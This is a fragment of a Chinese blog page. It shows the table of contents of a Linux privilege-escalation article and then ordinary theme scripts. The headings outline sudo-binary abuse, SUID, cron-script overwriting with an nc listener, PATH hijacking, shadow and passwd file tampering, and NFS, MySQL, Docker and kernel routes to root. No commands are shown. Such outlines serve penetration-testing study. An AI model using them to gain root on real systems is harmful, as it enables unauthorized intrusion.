href="#09-apt%E6%8F%90%E6%9D%83"><span class="toc-text">09.apt提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-pip%E6%8F%90%E6%9D%83"><span class="toc-text">10.pip提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-sed%E6%8F%90%E6%9D%83"><span class="toc-text">11.sed提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-tmux%E6%8F%90%E6%9D%83"><span class="toc-text">12.tmux提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-nmap%E6%8F%90%E6%9D%83"><span class="toc-text">13.nmap提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-taskset%E6%8F%90%E6%9D%83"><span class="toc-text">14.taskset提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-scp%E6%8F%90%E6%9D%83"><span class="toc-text">15.scp提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-ftp%E6%8F%90%E6%9D%83"><span class="toc-text">16.ftp提权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-perl%E6%8F%90%E6%9D%83"><span class="toc-text">17.perl提权</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#suid%E6%8F%90%E6%9D%83"><span class="toc-text">suid提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-text">计划任务提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E9%87%8D%E5%86%99"><span class="toc-text">文件重写</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8Bsystem-wide-crontab%E7%9A%84%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="toc-text">1.查看system-wide crontab的内容：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9C%A8%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%8A%E6%9F%A5%E6%89%BEoverwrite-sh-%E6%96%87%E4%BB%B6%EF%BC%9A"><span class="toc-text">2.在服务器上查找overwrite.sh 文件：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A3%80%E6%9F%A5%E6%96%87%E4%BB%B6%E7%9A%84%E6%9D%83%E9%99%90"><span class="toc-text">3.检查文件的权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%B0%86-overwrite-sh%E6%96%87%E4%BB%B6%E7%9A%84%E5%86%85%E5%AE%B9%E6%9B%BF%E6%8D%A2%E4%B8%BA%EF%BC%9A"><span class="toc-text">4.将 overwrite.sh文件的内容替换为：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-kali%E4%B8%8A%E8%BF%90%E8%A1%8Cnc"><span class="toc-text">5.kali上运行nc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81"><span class="toc-text">环境变量劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%EF%BC%9A"><span class="toc-text">查看定时任务：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%9C%A8-home-user-%E4%B8%AD%E5%88%9B%E5%BB%BA%E6%96%87%E4%BB%B6-overwrite-sh%EF%BC%8C%E5%86%85%E5%AE%B9%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">2.在&#x2F;home&#x2F;user 中创建文件 overwrite.sh，内容如下：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%8A%A0%E6%9D%83"><span class="toc-text">3.加权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E7%AD%89%E5%BE%85cronjob%E8%BF%90%E8%A1%8C%EF%BC%88%E6%AD%A4%E4%BD%9C%E4%B8%9A%E5%B0%A4%E5%85%B6%E6%AF%8F%E5%88%86%E9%92%9F%E8%BF%90%E8%A1%8C%E4%B8%80%E6%AC%A1%EF%BC%89%E3%80%82"><span class="toc-text">4.等待cronjob运行（此作业尤其每分钟运行一次）。</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%88%9B%E5%BB%BA-tmp-rootbash%E6%96%87%E4%BB%B6"><span class="toc-text">5.创建&#x2F;tmp&#x2F;rootbash文件</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E9%85%8D%E7%AC%A6"><span class="toc-text">通配符</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%8F%90%E6%9D%83"><span class="toc-text">环境变量提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BEsuid"><span class="toc-text">寻找suid</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%86%E5%90%91"><span class="toc-text">逆向</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81"><span class="toc-text">劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-echo"><span class="toc-text">1.echo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-cp"><span class="toc-text">2.cp</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E6%8F%90%E6%9D%83"><span class="toc-text">密码提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%8F%AF%E8%AF%BBshadow%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-text">一、可读shadow文件利用提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%8F%AF%E5%86%99shadow%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-text">二、可写shadow文件利用提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2-etc-shadow%E4%B8%ADroot%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-text">替换&#x2F;etc&#x2F;shadow中root的密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%8F%AF%E5%86%99passwd%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E6%8F%90%E6%9D%83"><span class="toc-text">三、可写passwd文件利用提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E6%9C%8D%E5%8A%A1"><span class="toc-text">第三方服务</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#NFS%E5%85%B1%E4%BA%AB"><span class="toc-text">NFS共享</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MYSQL"><span class="toc-text">MYSQL</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker"><span class="toc-text">docker</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83"><span class="toc-text">内核漏洞提权</span></a></li></ol></div><div class="widget-footer"><a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><!-- Icon from Solar by 480 Design - https://creativecommons.org/licenses/by/4.0/ --><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="1.5"><path stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/><path d="M7 3.338A9.95 9.95 0 0 1 12 2c5.523 0 10 4.477 10 10s-4.477 10-10 10S2 17.523 2 12c0-1.821.487-3.53 1.338-5"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+
+
+<script type="text/javascript">
+  window.canonical = {"originalHost":null,"officialHosts":["localhost"],"encoded":""};
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+    tag_plugins: {
+      chat: Object.assign({"api":"https://siteinfo.listentothewind.cn/api/v1"}),
+    }
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"skip_search":null,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
+    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
+    loading: `https://api.iconify.design/eos-icons:three-dots-loading.svg?color=%231cd0fd`,
+  };
+  const deps = {
+    jquery: `https://gcore.jsdelivr.net/npm/jquery@3.7/dist/jquery.min.js`,
+    marked: `https://gcore.jsdelivr.net/npm/marked@13.0/lib/marked.umd.min.js`,
+    lazyload: `/%5Bobject%20Object%5D`
+  }
+  
+
+</script>
+
+<script type="text/javascript">
+  
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = () => {
+          utils.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) => {
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index, 1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+
+  const utils = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    css: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    js: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      if (src.startsWith('/')) {
+        src = ctx.root + src.substring(1);
+      }
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function () {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    jq: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        utils.js(deps.jquery).then(fn)
+      } else {
+        fn()
+      }
+    },
+
+    onLoading: (el) => {
+      if (el) {
+        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
+      }
+    },
+    onLoadSuccess: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap').remove();
+      }
+    },
+    onLoadFailure: (el) => {
+      if (el) {
+        $(el).find('.loading-wrap svg').remove();
+        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
+        $(el).find('.loading-wrap').addClass('error');
+      }
+    },
+    request: (el, url, callback, onFailure) => {
+      const maxRetry = 3;
+      let retryCount = 0;
+
+      return new Promise((resolve, reject) => {
+        const load = () => {
+          utils.onLoading?.(el);
+
+          let timedOut = false;
+          const timeout = setTimeout(() => {
+            timedOut = true;
+            console.warn('[request] 超时:', url);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject('请求超时');
+            } else {
+              setTimeout(load, 1000);
+            }
+          }, 5000);
+
+          fetch(url).then(resp => {
+            if (timedOut) return;
+            clearTimeout(timeout);
+
+            if (!resp.ok) throw new Error('响应失败');
+            return resp;
+          }).then(data => {
+            if (timedOut) return;
+            utils.onLoadSuccess?.(el);
+            callback(data);
+            resolve(data);
+          }).catch(err => {
+            clearTimeout(timeout);
+            console.warn('[request] 错误:', err);
+
+            if (++retryCount >= maxRetry) {
+              utils.onLoadFailure?.(el);
+              onFailure?.();
+              reject(err);
+            } else {
+              setTimeout(load, 1000);
+            }
+          });
+        };
+
+        load();
+      });
+    },
+    requestWithoutLoading: (url, options = {}, maxRetry = 2, timeout = 5000) => {
+      return new Promise((resolve, reject) => {
+        let retryCount = 0;
+
+        const tryRequest = () => {
+          let timedOut = false;
+          const timer = setTimeout(() => {
+            timedOut = true;
+            if (++retryCount > maxRetry) reject('timeout');
+            else tryRequest();
+          }, timeout);
+
+          fetch(url, options)
+            .then(resp => {
+              clearTimeout(timer);
+              if (!resp.ok) throw new Error('bad response');
+              resolve(resp);
+            })
+            .catch(err => {
+              clearTimeout(timer);
+              if (++retryCount > maxRetry) reject(err);
+              else setTimeout(tryRequest, 500);
+            });
+        };
+
+        tryRequest();
+      });
+    },
+    /********************** requestAnimationFrame ********************************/
+    // 1、requestAnimationFrame 会把每一帧中的所有 DOM 操作集中起来，在一次重绘或回流中就完成，并且重绘或回流的时间间隔紧紧跟随浏览器的刷新频率，一般来说，这个频率为每秒60帧。
+    // 2、在隐藏或不可见的元素中，requestAnimationFrame 将不会进行重绘或回流，这当然就意味着更少的的 cpu，gpu 和内存使用量。
+    requestAnimationFrame: (fn) => {
+      if (!window.requestAnimationFrame) {
+        window.requestAnimationFrame = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame;
+      }
+      window.requestAnimationFrame(fn)
+    },
+    dark: {},
+  };
+
+  // utils.dark.mode 当前模式 dark or light
+  // utils.dark.toggle() 暗黑模式触发器
+  // utils.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  utils.dark.method = {
+    toggle: new RunItem(),
+  };
+  utils.dark = Object.assign(utils.dark, {
+    push: utils.dark.method.toggle.push,
+  });
+</script>
+<script>
+  const sidebar = {
+    leftbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    rightbar: () => {
+      if (l_body) {
+        l_body.toggleAttribute('rightbar');
+        l_body.removeAttribute('leftbar');
+      }
+    },
+    dismiss: () => {
+      if (l_body) {
+        l_body.removeAttribute('leftbar');
+        l_body.removeAttribute('rightbar');
+      }
+    },
+    toggleTOC: () => {
+      document.querySelector('#data-toc').classList.toggle('collapse');
+    }
+  }
+</script>
+<script type="text/javascript">
+  (() => {
+    const tagSwitchers = document.querySelectorAll('.tag-subtree.parent-tag > a > .tag-switcher-wrapper')
+    for (const tagSwitcher of tagSwitchers) {
+      tagSwitcher.addEventListener('click', (e) => {
+        const parent = e.target.closest('.tag-subtree.parent-tag')
+        parent.classList.toggle('expanded')
+        e.preventDefault()
+      })
+    }
+
+    // Get active tag from query string, then activate it.
+    const urlParams = new URLSearchParams(window.location.search)
+    const activeTag = urlParams.get('tag')
+    if (activeTag) {
+      let tag = document.querySelector(`.tag-subtree[data-tag="${activeTag}"]`)
+      if (tag) {
+        tag.querySelector('a').classList.add('active')
+        
+        while (tag) {
+          tag.classList.add('expanded')
+          tag = tag.parentElement.closest('.tag-subtree.parent-tag')
+        }
+      }
+    }
+  })()
+</script>
+
+<script async src="https://gcore.jsdelivr.net/npm/vanilla-lazyload@19.1/dist/lazyload.min.js"></script>
+<script>
+  // https://www.npmjs.com/package/vanilla-lazyload
+  // Set the options globally
+  // to make LazyLoad self-initialize
+  window.lazyLoadOptions = {
+    elements_selector: ".lazy",
+    callback_loaded: (el) => {
+      el.classList.add('loaded');
+      const wrapper = el.closest('.lazy-box');
+      const icon = wrapper?.querySelector('.lazy-icon');
+      if (icon) icon.remove();
+    }
+  };
+  // Listen to the initialization event
+  // and get the instance of LazyLoad
+  window.addEventListener(
+    "LazyLoad::Initialized",
+    function (event) {
+      window.lazyLoadInstance = event.detail.instance;
+    },
+    false
+  );
+  document.addEventListener('DOMContentLoaded', function () {
+    window.lazyLoadInstance?.update();
+  });
+
+  window.wrapLazyloadImages = (container) => {
+    if (typeof container === 'string') {
+      container = document.querySelector(container);
+    }
+    if (!container) return;
+    
+    const images = container.querySelectorAll('img');
+    images.forEach((img) => {
+      if (img.classList.contains('lazy')) return;
+
+      const src = img.getAttribute('src');
+      if (!src) return;
+
+      const wrapper = document.createElement('div');
+      wrapper.className = 'lazy-box';
+
+      const newImg = img.cloneNode();
+      newImg.removeAttribute('src');
+      newImg.setAttribute('data-src', src);
+      newImg.classList.add('lazy');
+
+      const icon = document.createElement('div');
+      icon.className = 'lazy-icon';
+      if (def.loading) {
+        icon.style.backgroundImage = `url("${def.loading}")`;
+      }
+
+      wrapper.appendChild(newImg);
+      wrapper.appendChild(icon);
+
+      img.replaceWith(wrapper);
+    });
+
+    // 通知 LazyLoad 更新
+    if (window.lazyLoadInstance?.update) {
+      window.lazyLoadInstance.update();
+    }
+  }
+  
+</script>
+
+<!-- required -->
+<script src="/js/main.js?v=1.33.1" defer></script>
+
+<script type="text/javascript">
+  const applyTheme = (theme) => {
+    if (theme === 'auto') {
+      document.documentElement.removeAttribute('data-theme')
+    } else {
+      document.documentElement.setAttribute('data-theme', theme)
+    }
+
+    // applyThemeToGiscus(theme)
+  }
+
+  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
+  const applyThemeToGiscus = (theme) => {
+    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
+    const cmt = document.getElementById('giscus')
+    if (cmt) {
+      // This works before giscus load.
+      cmt.setAttribute('data-theme', theme)
+    }
+
+    const iframe = document.querySelector('#comments > section.giscus > iframe')
+    if (iframe) {
+      // This works after giscus loaded.
+      const src = iframe.src
+      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
+      iframe.src = newSrc
+    }
+  }
+
+  const switchTheme = () => {
+    // light -> dark -> auto -> light -> ...
+    const currentTheme = document.documentElement.getAttribute('data-theme')
+    let newTheme;
+    switch (currentTheme) {
+      case 'light':
+        newTheme = 'dark'
+        break
+      case 'dark':
+        newTheme = 'auto'
+        break
+      default:
+        newTheme = 'light'
+    }
+    applyTheme(newTheme)
+    window.localStorage.setItem('Stellar.theme', newTheme)
+    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
+    utils.dark.method.toggle.start();
+
+    const messages = {
+      light: `切换到浅色模式`,
+      dark: `切换到深色模式`,
+      auto: `切换到跟随系统配色`,
+    }
+    hud?.toast?.(messages[newTheme])
+  }
+
+  (() => {
+    // Apply user's preferred theme, if any.
+    const theme = window.localStorage.getItem('Stellar.theme')
+    if (theme !== null) {
+      applyTheme(theme)
+    } else {
+      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
+    }
+    utils.dark.method.toggle.start();
+  })()
+</script>
+
+
+<!-- optional -->
+
+
+
+<script defer>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"}}`));
+    for (let id of Object.keys(ctx.services)) {
+      const js = ctx.services[id].js;
+      if (id == 'siteinfo') {
+        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
+        if (ctx.cardlinks?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            setCardLink(ctx.cardlinks);
+          });
+        }
+      } else if (id == 'voice') {
+        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
+        if (ctx.voiceAudios?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            createVoiceDom(ctx.voiceAudios);
+          });
+        }
+      } else if (id == 'video') {
+        ctx.videos = document.querySelectorAll('.video>video');
+        if (ctx.videos?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            videoEvents(ctx.videos);
+          });
+        }
+      } else if (id == 'download-file') {
+        ctx.files = document.querySelectorAll('.file');
+        if (ctx.files?.length > 0) {
+          utils.js(js, { defer: true }).then(function () {
+            downloadFileEvent(ctx.files);
+          });
+        }
+      } else {
+        const els = document.getElementsByClassName(`ds-${id}`);
+        if (els?.length > 0) {
+          utils.jq(() => {
+            if (id == 'timeline' || 'memos' || 'marked') {
+              utils.js(deps.marked).then(function () {
+                utils.js(js, { defer: true });
+              });
+            } else {
+              utils.js(js, { defer: true });
+            }
+          });
+        }
+      }
+    }
+
+    // chat iphone time
+    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');
+
+    if (phoneTimes.length > 0) {
+      NowTime();
+      var date = new Date();
+      var sec = date.getSeconds();
+      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
+    }
+
+    function firstAdjustTime() {
+      NowTime();
+      clearInterval(firstAdjustInterval);
+      setInterval(NowTime, 1000 * 60);
+    }
+
+    function NowTime() {
+      for (let i = 0; i < phoneTimes.length; ++i) {
+        var timeSpan = phoneTimes[i];
+        var date = new Date();
+        var hour = date.getHours();
+        var min = date.getMinutes();
+        timeSpan.innerHTML = check(hour) + ":" + check(min);
+      }
+    };
+
+    function check(val) {
+      if (val < 10) {
+        return ("0" + val);
+      }
+      return (val);
+    }
+
+    // chat quote
+    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
+      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
+          observer.unobserve(entry.target);
+          setTimeout(() => {
+            entry.target.classList.add('quote-blink');
+            setTimeout(() => {
+              entry.target.classList.remove('quote-blink');
+            }, 1000);
+          }, Math.max(100, 16) * (index + 1));
+        });
+    });
+
+    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
+    chatQuotes.forEach((quote) => {
+      quote.addEventListener('click', function () {
+        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
+        if (chatCellDom) {
+          var chatDiv = chatCellDom.parentElement;
+          var mid = chatDiv.clientHeight / 2;
+          var offsetTop = chatCellDom.offsetTop;
+          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
+            chatDiv.scrollTo({
+              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
+              behavior: "smooth"
+            });
+          } else {
+            chatDiv.scrollTo({
+              top: 0,
+              behavior: "smooth"
+            });
+          }
+          chat_quote_obverser.observe(chatCellDom);
+        }
+      });
+    });
+  });
+</script>
+
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    ctx.search = {
+      path: `/search.json`,
+    }
+    utils.js('/js/search/local-search.js', { defer: true });
+  });
+</script><script>
+  window.FPConfig = {
+    delay: 0,
+    ignoreKeywords: [],
+    maxRPS: 5,
+    hoverDelay: 25
+  };
+</script>
+<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
+  ctx.fancybox = {
+    selector: `.timenode p>img`,
+    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
+    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
+  };
+  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
+  if (ctx.fancybox.selector) {
+    selector += `, ${ctx.fancybox.selector}`
+  }
+  var needFancybox = document.querySelectorAll(selector).length !== 0;
+  if (!needFancybox) {
+    const memos = document.getElementsByClassName('ds-memos');
+    if (memos != undefined && memos.length > 0) {
+      needFancybox = true;
+    }
+    const fancybox = document.getElementsByClassName('with-fancybox');
+    if (fancybox != undefined && fancybox.length > 0) {
+      needFancybox = true;
+    }
+  }
+  if (needFancybox) {
+    utils.css(ctx.fancybox.css);
+    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
+      Fancybox.bind(selector, {
+        hideScrollbar: false,
+        Thumbs: {
+          autoStart: false,
+        },
+        caption: (fancybox, slide) => {
+          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
+        }
+      });
+    })
+  }
+</script>
+<script>
+  window.addEventListener('DOMContentLoaded', (event) => {
+    const swiper_api = document.getElementById('swiper-api');
+    if (swiper_api != undefined) {
